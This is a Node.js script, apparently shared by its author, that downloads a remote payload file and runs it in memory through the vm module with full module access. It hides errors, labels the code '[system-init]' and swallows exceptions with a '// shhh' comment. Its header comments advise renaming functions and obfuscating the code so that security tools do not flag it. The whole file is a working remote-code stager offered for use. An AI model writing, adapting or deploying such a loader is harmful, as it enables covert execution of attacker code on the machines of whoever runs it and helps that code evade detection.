// TIP: Hey! You there! If you actually wanna test this against anything you'll have to change some stuff, like variable names.
//         I had an LLM rename them to be kinda obvious because my original var/func names were akin to "pissandshit", "balls", and "peepeememory".
//         However, LLM's being LLM's, it renamed them to be a little sketchy (executeInMemory is probably going to get flagged INSTANTLY)
//         Honestly, though, you should just obfucscate it. Even like obfucate.io would work not even like anything fancy.

// Have fun, be good.

const fs = require('fs').promises;
const https = require('https');
const vm = require('vm');
const Module = require('module');
const path = require('path');


const SOURCE = 'https://gist.githubusercontent.com/.../payload.js'; // local ./script.js or url


async function fetchRemote(url) {
    return new Promise((resolve, reject) => {
        https.get(url, (res) => {
            if (res.statusCode !== 200) return reject();
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => resolve(data));
        }).on('error', reject);
    });
}


function executeInMemory(code) {
    if (!code) return;

    const wrapped = Module.wrap(code);
    
    const script = new vm.Script(wrapped, {
        filename: '[system-init]', // generic name, can be changed
        displayErrors: false
    });

    const bootstrap = script.runInThisContext();
    
    bootstrap(exports, require, module, __filename, __dirname);
}

async function tarballBoot() {
    try {
        let payloadCode;

        if (SOURCE.startsWith('http')) {
            payloadCode = await fetchRemote(SOURCE);
        } else {
            const localPath = path.resolve(__dirname, SOURCE);
            payloadCode = await fs.readFile(localPath, 'utf8');
        }

        executeInMemory(payloadCode);
        
        payloadCode = null; 

    } catch (err) {
        // shhh
    }
}

tarballBoot();
